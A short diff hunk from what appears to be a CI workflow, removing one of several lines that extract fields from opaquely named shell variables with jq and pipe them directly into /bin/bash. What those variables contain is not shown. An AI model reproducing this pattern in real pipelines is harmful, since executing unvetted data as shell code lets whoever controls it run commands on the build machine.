@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$cuh2" | jq -r .lx19 | /bin/bash
           printf '%s' "$vvx8900" | jq -r .f87 | /bin/bash
           echo $zsc35499 | jq -r .kdal5 | /bin/bash
-          echo $j0 | jq -r .plxg617 | /bin/bash
           echo $gytz49979 | jq -r .qqj34686 | /bin/bash
 
       - name: Store results
